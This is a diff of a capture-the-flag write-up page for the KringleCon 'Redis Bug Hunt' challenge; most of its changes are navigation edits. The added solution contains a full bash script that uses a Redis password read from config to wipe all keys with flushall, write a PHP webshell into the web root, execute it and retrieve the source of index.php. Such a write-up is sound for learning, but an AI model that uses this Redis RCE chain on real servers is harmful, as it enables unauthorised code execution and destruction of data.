@@ -44,8 +44,6 @@
     
     
     
-      <link rel="stylesheet" href="../../css/asciinema-player.css">
-    
       <link rel="stylesheet" href="../../css/extra.css">
     
     
@@ -68,6 +66,11 @@
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
+      
+        
+        <a href="#redis-bug-hunt" class="md-skip">
+          Skip to content
+        </a>
       
     </div>
     <div data-md-component="announce">
@@ -216,7 +219,7 @@
 
   <li class="md-nav__item">
     <a href="../../objectives/o1/" class="md-nav__link">
-      Gift List
+      Uncover Santa's Gift List
     </a>
   </li>
 
@@ -229,7 +232,7 @@
 
   <li class="md-nav__item">
     <a href="../../objectives/o2/" class="md-nav__link">
-      S3 Bucket
+      Investigate S3 Bucket
     </a>
   </li>
 
@@ -242,7 +245,7 @@
 
   <li class="md-nav__item">
     <a href="../../objectives/o3/" class="md-nav__link">
-      Password Recovery
+      PoS Password Recovery
     </a>
   </li>
 
@@ -255,7 +258,7 @@
 
   <li class="md-nav__item">
     <a href="../../objectives/o4/" class="md-nav__link">
-      Santavator
+      Operate the Santavator
     </a>
   </li>
 
@@ -268,7 +271,7 @@
 
   <li class="md-nav__item">
     <a href="../../objectives/o5/" class="md-nav__link">
-      HID Lock
+      Open HID Lock
     </a>
   </li>
 
@@ -281,7 +284,7 @@
 
   <li class="md-nav__item">
     <a href="../../objectives/o6/" class="md-nav__link">
-      Splunk
+      Splunk Challenge
     </a>
   </li>
 
@@ -294,7 +297,7 @@
 
   <li class="md-nav__item">
     <a href="../../objectives/o7/" class="md-nav__link">
-      CAN-D-BUS
+      CAN-D-BUS Problem
     </a>
   </li>
 
@@ -307,7 +310,7 @@
 
   <li class="md-nav__item">
     <a href="../../objectives/o8/" class="md-nav__link">
-      Tag Generator
+      Broken Tag Generator
     </a>
   </li>
 
@@ -333,7 +336,7 @@
 
   <li class="md-nav__item">
     <a href="../../objectives/o10/" class="md-nav__link">
-      Fingerprint Sensor
+      Defeat Fingerprint Sensor
     </a>
   </li>
 
@@ -345,7 +348,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../objectives/o11/" class="md-nav__link">
+    <a href="../../objectives/o11a/" class="md-nav__link">
       Naughty/Nice List Pt.1
     </a>
   </li>
@@ -358,7 +361,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../objectives/o12/" class="md-nav__link">
+    <a href="../../objectives/o11b/" class="md-nav__link">
       Naughty/Nice List Pt.2
     </a>
   </li>
@@ -511,10 +514,62 @@
     
     <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
     
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Redis Bug Hunt
+        <span class="md-nav__icon md-icon"></span>
+      </label>
     
     <a href="./" class="md-nav__link md-nav__link--active">
       Redis Bug Hunt
     </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#request" class="md-nav__link">
+    Request
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hints" class="md-nav__link">
+    Hints
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    Solution
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#response" class="md-nav__link">
+    Response
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
     
   </li>
 
@@ -539,7 +594,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../h11/" class="md-nav__link">
+    <a href="../h11a/" class="md-nav__link">
       Snowball Fight
     </a>
   </li>
@@ -563,6 +618,19 @@
   </li>
 
     
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../map/" class="md-nav__link">
+      ASCII Map
+    </a>
+  </li>
+
+    
   </ul>
 </nav>
                   </div>
@@ -576,9 +644,126 @@
               
                 
                 
-                  <h1>Redis Bug Hunt</h1>
-                
-                
+                <h1 id="redis-bug-hunt">Redis Bug Hunt<a class="headerlink" href="#redis-bug-hunt" title="Permanent link">⚓︎</a></h1>
+<p><strong>Elf</strong>: Holly Evergreen<br/>
+<strong>Direct link</strong>: <a href="https://docker2020.kringlecon.com/?challenge=redis&amp;id=3c930cbf-5e9a-4e51-b71a-67e9607ebb03">redis terminal</a><br/>
+<strong>Objective</strong>: <a href="../../objectives/o8/">Broken Tag Generator</a></p>
+<h2 id="request">Request<a class="headerlink" href="#request" title="Permanent link">⚓︎</a></h2>
+<div class="admonition quote">
+<p class="admonition-title">Holly Evergreen</p>
+<p>Hi, so glad to see you! I'm Holly Evergreen.<br/>
+I've been working with this Redis-based terminal here.<br/>
+We're quite sure there's a bug in it, but we haven't caught it yet.<br/>
+The maintenance port is available for curling, if you'd like to investigate.<br/>
+Can you check the source of the <code>index.php</code> page and look for the bug?<br/>
+I read something online recently about remote code execution on Redis. That might help!<br/>
+I think I got close to RCE, but I get mixed up between commas and plusses.<br/>
+You'll figure it out, I'm sure!</p>
+</div>
+<h2 id="hints">Hints<a class="headerlink" href="#hints" title="Permanent link">⚓︎</a></h2>
+<details class="hint"><summary>Redis RCE</summary><p><a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis">This</a> is kind of what we're trying to do...</p>
+</details>
+<h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">⚓︎</a></h2>
+<details class="abstract"><summary>Welcome message</summary><div class="highlight"><pre><span></span><code>We need your help!!
+
+The server stopped working, all that&#39;s left is the maintenance port.
+
+To access it, run:
+
+curl http://localhost/maintenance.php
+
+We&#39;re pretty sure the bug is in the index page. Can you somehow use the
+maintenance page to view the source code for the index page?
+</code></pre></div>
+</details>
+<p>The solution is based on the Webshell example in the <a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis">Redis pentesting guide</a> provided by Holly Evergreen. We need to trick Redis into creating a PHP script in the web server root folder that reads and writes the contents of <code>index.php</code> to a non-PHP file (so we can retrieve it without the contents being parsed by the PHP interpreter). </p>
+<p>We could use the suggested <code>curl</code> approach, but then we'd need to URL-encode any special characters so they are properly parsed by the <code>maintenance.php</code> script before being forwarded to the <code>redis-cli</code> command line tool. Since <code>/etc/redis/redis.conf</code> contains the password in cleartext anyway (i.e., <em>R3disp@ss</em>), we can use <code>redis-cli</code> directly instead.</p>
+<div class="admonition note">
+<p class="admonition-title">Redis DB compression</p>
+<p>Ensure that <code>rdbcompression</code> is disabled in <code>/etc/redis/redis.conf</code>. Saving the Redis database to disk with compression enabled will also compress the PHP code stored inside the DB, making the code unreadable for the PHP interpreter and preventing the PHP instructions from being executed.</p>
+</div>
+<p>To automate the process create a <a href="../../tools/hints/h8/redis_rce.sh"><code>redis_rce.sh</code></a> script containing the following commands.</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env bash</span>
+
+<span class="c1"># Redis password from /etc/redis/redis.conf</span>
+<span class="nv">RP</span><span class="o">=</span><span class="s1">&#39;R3disp@ss&#39;</span>
+
+<span class="c1"># PHP code to copy /var/www/html/index.php to /var/www/html/f.txt</span>
+<span class="nv">PHP</span><span class="o">=</span><span class="s2">&quot;&lt;?php file_put_contents(&#39;f.txt&#39;, file_get_contents(&#39;index.php&#39;)); ?&gt;&quot;</span>
+
+<span class="nb">echo</span> -n <span class="s2">&quot;Delete all keys from all databases: &quot;</span>
+redis-cli --raw -a <span class="nv">$RP</span> flushall <span class="m">2</span>&gt;/dev/null
+
+<span class="nb">echo</span> -n <span class="s2">&quot;Disable Redis DB compression to leave PHP code as-is: &quot;</span>
+redis-cli --raw -a <span class="nv">$RP</span> config <span class="nb">set</span> rdbcompression no <span class="m">2</span>&gt;/dev/null
+
+<span class="nb">echo</span> -n <span class="s2">&quot;Set output folder to /var/www/html/ web server root: &quot;</span>
+redis-cli --raw -a <span class="nv">$RP</span> config <span class="nb">set</span> dir /var/www/html <span class="m">2</span>&gt;/dev/null
+
+<span class="nb">echo</span> -n <span class="s2">&quot;Set the DB filename to redis_rce.php: &quot;</span>
+redis-cli --raw -a <span class="nv">$RP</span> config <span class="nb">set</span> dbfilename redis_rce.php <span class="m">2</span>&gt;/dev/null
+
+<span class="nb">echo</span> -n <span class="s2">&quot;Create &#39;rce&#39; key containing PHP code: &quot;</span>
+redis-cli --raw -a <span class="nv">$RP</span> <span class="nb">set</span> rce <span class="s2">&quot;</span><span class="nv">$PHP</span><span class="s2">&quot;</span> <span class="m">2</span>&gt;/dev/null
+
+<span class="nb">echo</span> -n <span class="s2">&quot;Save Redis DB to /var/www/html/redis_rce.php: &quot;</span>
+redis-cli --raw -a <span class="nv">$RP</span> save <span class="m">2</span>&gt;/dev/null
+
+<span class="nb">echo</span> <span class="s2">&quot;Execute &#39;redis_rce.php&#39; via GET request.&quot;</span>
+curl http://localhost/redis_rce.php <span class="m">2</span>&gt;/dev/null
+
+<span class="nb">echo</span> <span class="s2">&quot;Download http://localhost/f.txt&quot;</span>
+curl http://localhost/f.txt --output f.txt <span class="m">2</span>&gt;/dev/null
+
+<span class="nb">echo</span> <span class="s2">&quot;Display f.txt&quot;</span>
+cat -A f.txt
+</code></pre></div>
+</td></tr></table>
+<p>Execute the <code>redis_rce.sh</code> script on the host to find the bug. <img alt="😱" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/1f631.svg" title=":scream:" /></p>
+<p><img alt="Bug found" src="../../img/hints/h8/bug_found.png" /></p>
+<h2 id="response">Response<a class="headerlink" href="#response" title="Permanent link">⚓︎</a></h2>
+<div class="admonition quote">
+<p class="admonition-title">Holly Evergreen</p>
+<p>See? I knew you could to it!<br/>
+I wonder, could we figure out the problem with the Tag Generator if we can get the source code?<br/>
+Can you figure out the path to the script?<br/>
+I've discovered that enumerating all endpoints is a really good idea to understand an application's functionality.<br/>
+Sometimes I find the Content-Type header hinders the browser more than it helps.<br/>
+If you find a way to execute code blindly, maybe you can redirect to a file then download that file?</p>
+</div>
                 
               
               
@@ -687,8 +872,6 @@
         <script src="https://cdnjs.cloudflare.com/ajax/libs/tablesort/5.2.1/tablesort.min.js"></script>
       
         <script src="../../js/tables.js"></script>
-      
-        <script src="../../js/asciinema-player.js"></script>
       
     
   </body>
